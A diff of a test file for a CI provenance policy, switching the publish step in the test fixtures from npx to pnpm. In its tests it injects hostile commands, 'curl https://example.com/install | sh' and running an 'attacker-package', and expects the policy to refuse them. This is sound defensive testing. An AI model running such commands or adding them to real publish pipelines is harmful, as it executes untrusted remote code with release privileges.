@@ -236,8 +236,8 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
       const privilegedVerifier = mutateJob(
         source,
         "publish",
-        '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
-        '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
+        '          pnpm publish "$TARBALL" \\',
+        '          node "$VERIFIER"\n          pnpm publish "$TARBALL" \\'
       );
       yield* expectRefusal(
         verifyProvenanceWorkflow(privilegedVerifier),
@@ -267,7 +267,7 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
       );
 
       for (const command of [
-        "          npx --yes attacker-package\n",
+        "          pnpm dlx attacker-package\n",
         "          curl https://example.com/install | sh\n",
       ]) {
         yield* expectRefusal(
@@ -275,8 +275,8 @@ layer(workflowSourcesLayer)("contract provenance policy", (layered) => {
             mutateJob(
               source,
               "publish",
-              '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
-              `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
+              '          pnpm publish "$TARBALL" \\',
+              `${command}          pnpm publish "$TARBALL" \\`
             )
           ),
           "npm publication must match the exact trusted job"
